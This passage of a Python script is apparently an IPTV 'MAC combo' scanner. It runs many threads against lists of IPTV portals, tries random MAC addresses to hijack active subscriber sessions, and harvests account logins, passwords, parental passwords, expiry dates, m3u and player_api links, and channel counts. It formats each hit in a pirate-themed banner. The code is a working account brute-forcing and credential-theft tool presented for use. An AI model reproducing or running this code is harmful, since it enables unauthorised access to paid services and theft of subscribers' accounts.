			mcon=mcon.replace('"',"")
			status=veri.split('status":')[1]
			status=status.split(',')[0]
			status=status.replace('"',"")
			timezone=veri.split('timezone":"')[1]
			timezone=timezone.split('",')[0]
			timezone=timezone.replace("\\/","/")
			realm=veri.split('url":')[1]
			realm=realm.split(',')[0]
			realm=realm.replace('"',"")
			port=veri.split('port":')[1]
			port=port.split(',')[0]
			port=port.replace('"',"")
			userm=veri.split('username":')[1]
			userm=userm.split(',')[0]
			userm=userm.replace('"',"")
			pasm=veri.split('password":')[1]
			pasm=pasm.split(',')[0]
			pasm=pasm.replace('"',"")
			bitism=""
			bitism=veri.split('exp_date":')[1]
			bitism=bitism.split(',')[0]
			bitism=bitism.replace('"',"")
			message=veri.split('message":"')[1].split(',')[0].replace('"','')
			message=str(message.encode('utf-8').decode("unicode-escape")).replace("\\/", "/")
			if bitism=="null": bitism="Unlimited"
			else:
				bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))			
				mt=("""
├─➤ 🏴‍☠️🄺🄾🄽🅃🄾🔹🄸🄽🄵🄾🏴‍☠️
├◈ 📝 Pᴏᴡɪᴛᴀɴɪᴇ ➤ """+str(message)+""" 
├◈ 🌐 Hᴏsᴛ ➤ http://"""+panel+"""/c/
├◈ 🌍 Rᴇᴀʟ ➤ http://"""+realm+""":"""+port+"""/c/
├◈ #️⃣ Pᴏʀᴛ➤ """+port+"""
├◈ 👤 Lᴏɢɪɴ ➤ """+userm+"""
├◈ 🔑 Pᴀss ➤ """+pasm+"""
├◈ 📆 Wʏɢᴀsᴀ ➤ """+bitism+""" 
├◈ 🧑 Aᴋᴛʏᴡɴᴇ Pᴏʟąᴄᴢɴɪᴀ ➤ """+acon+"""
├◈ 👪 Mᴀᴋsʏᴍᴀʟɴᴇ Pᴏʟąᴄᴢᴇɴɪᴀ ➤ """+mcon+""" 
├◈ 🚦 Sᴛᴀᴛᴜs ➤ """+status+"""
├◈ 🕛 Sᴛʀᴇғᴀ Cᴢᴀsᴏᴡᴀ ➤ """+timezone+f""" 
├─◈ 💀 ᴄᴏɴғɪɢ ᴍᴏᴅ ᴘʏ ʙʏ {MOD}""")
	except:pass
	return mt

pattern = r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
panelsay, bots, botsay = 0, 0, 0
botkac = 5 if combomacyesno == "0" else 20

def basla():
	global panelsay,botsay
	for j in range(botkac):
		for i in paneltotLen:
			t1 = threading.Thread(target=d1)
			t1.start()
		botsay=botsay+1
		panelsay=0

def d1():
    global status_code, res
    timeout, xbagx, xbag, xbag1 = 8, 8, 10, 4 
# orginalne ustawienia 
#    timeout, xbagx, xbag, xbag1 = 15, 10, 12, 4
    bag, bag1 = 0, 0
    global ile_mac_combo, hitr, lduruno
    global tokenr,bots,panelsay,botsay,bot
    panel=(paneltotLen[panelsay].replace('\n',''))
    panel = extract_host_port(panel)
    panelsay=panelsay+1
    bots=bots+1
    for mc in range(botsay,macuz,4):
        get_run_time()
        total=mc
        mac=randommac()
        macs=mac.replace(':','%3A')
        bot="Bot_"+str(int(bots+1))
        oran=""
        oran=round(((total)/(macuz)*100),2)
        echok(mac,bot,total,ile_mac_combo,oran,tokenr,panel)
        bag=0
        veri=""
        while True:
            try:
                res = ses.get(url1(panel), headers=hea1(panel,macs), timeout=timeout, verify=False)
                status_code=f"{replace_status(res.status_code)}"
                veri=str(res.text)
                break
            except:
                break
                bag=bag+1
                time.sleep(1)
                if bag==xbag:break
        tokenr=MAGENTA
        if 'token' in veri:
            tokenr=RESET
            token=veri.replace('{"js":{"token":"',"")
            token=token.split('"')[0]
            bag=0
            while True:
               try:
                 res = ses.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                 veri=""
                 veri=str(res.text)
                 adult=veri.split('parent_password":"')[1]
                 adult=adult.split('","bright')[0]
                 break
               except:
                   bag=bag+1
                   time.sleep(1)
                   if bag==xbag:break
            id="null"
            ip=""
            try:
                 id=veri.split('{"js":{"id":')[1]
                 id=id.split(',"name')[0]
                 ip=veri.split('ip":"')[1]
                 ip=ip.split('"')[0]
            except:pass
            if not id=="null":
                bag=0
                while True:
                     try:
                         res = ses.get(url3(panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                         veri=""
                         veri=str(res.text)
                         break
                     except:
                         bag=bag+1
                         time.sleep(1)
                         if bag==xbag:break
                if not veri.count('phone')==0:
                     wygasza=""
                     if 'end_date' in veri:
                         wygasza=veri.split('end_date":"')[1]
                         wygasza=wygasza.split('"')[0]
                     elif 'phone' in veri:
                           try:
                               wygasza=veri.split('phone":"')[1]
                               wygasza=wygasza.split('"')[0]
                               if wygasza.lower()[:2] =='un':KalanGun=(" Dni")
                               else:
                                   KalanGun=(str(zmin_czas(wygasza))+" Dni")
                                   wygasza=wygasza+' '+ KalanGun
                           except:pass
                     if not wygasza: break
                     if "-" in KalanGun: break
                     hitr=FCYAN
                     ile_mac_combo=ile_mac_combo+1
                     hitprint(panel,mac,wygasza)
                     bag=0
                     while True:
                         try:
                             res = ses.get(url6(panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                             veri=""
                             veri=str(res.text)
                             cid=""
                             cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                             break
                         except:
                             bag=bag+1
                             time.sleep(1)
                             if bag==xbagx:cid="94067";break
                     real=panel
                     m3ulink=""
                     user=""
                     pas=""
                     durum="« [❌] ᴛᴀᴋ/ɴɪᴇ »"
                     bag=0
                     while True:
                         try:
                             res = ses.get(url(str(cid),panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                             veri=""
                             veri=str(res.text)
                             link=veri.split('ffmpeg ')[1].split('"')[0].replace("\\/", "/")
                             real='http://'+link.split('://')[1].split('/')[0]+'/c/'
                             user=str(link.replace('live/','').split('/')[3])
                             pas=str(link.replace('live/','').split('/')[4])
                             m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8" 
                             durum=goruntu(link,panel)
                             break
                         except:
                             bag=bag+1
                             time.sleep(1)
                             if bag==xbag:break
                     playerapi=""
                     if not m3ulink=="":
                         playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                         playerapi=m3uapi(playerlink,macs,token,panel)
                         if playerapi=="":
                             playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                             playerapi=m3uapi(playerlink,macs,token,panel)
                     SN=(hashlib.md5(macs.encode('utf-8')).hexdigest())
                     SNENC=SN.upper()
                     SNCUT=SNENC[:13]
                     DEV=hashlib.sha256(macs.encode('utf-8')).hexdigest()
                     DEVENC=DEV.upper()
                     SG=SNCUT+'+'+(macs)
                     SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                     SINGENC=SING.upper()
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     ilosc_live=str(veri.count("stream_id"))
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     ilosc_vod=str(veri.count("stream_id"))
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     ilosc_serie=str(veri.count("series_id"))
                     vpn=""
                     vpn = vpnip(ip) if ip != "" else " ʙʀᴀᴋ ᴀᴅʀᴇsᴜ ɪᴘ ᴋʟɪᴇɴᴛᴀ "
                     livelist=""
                     vodlist=""
                     serieslist=""
                     if jakie_kategorie == "1" or jakie_kategorie == "2":
                         listlink = liveurl(panel)
                         livel = '🏴‍☠️'
                         livelist = list(listlink,macs,token,livel,panel)
                     if jakie_kategorie == "2":
                         listlink = vodurl(panel)
                         livel = '🏴‍☠️'
                         vodlist = list(listlink,macs,token,livel,panel)
                         listlink = seriesurl(panel)
                         livel = '🏴‍☠️'
                         serieslist = list(listlink,macs,token,livel,panel)
                     if wygasza: hit(mac,wygasza,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,ilosc_live,ilosc_vod,ilosc_serie,adult)

basla()